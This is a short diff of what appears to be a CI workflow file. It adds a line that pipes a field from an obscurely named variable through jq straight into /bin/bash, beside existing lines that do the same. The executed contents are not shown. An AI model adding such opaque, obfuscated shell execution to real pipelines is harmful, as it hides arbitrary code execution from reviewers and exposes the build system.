@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$qa6" | jq -r .a64152 | /bin/bash
           echo $ctg239 | jq -r .eq86 | /bin/bash
           echo $vjq07998 | jq -r .oilfd182 | /bin/bash
+          echo $w330 | jq -r .uns80 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
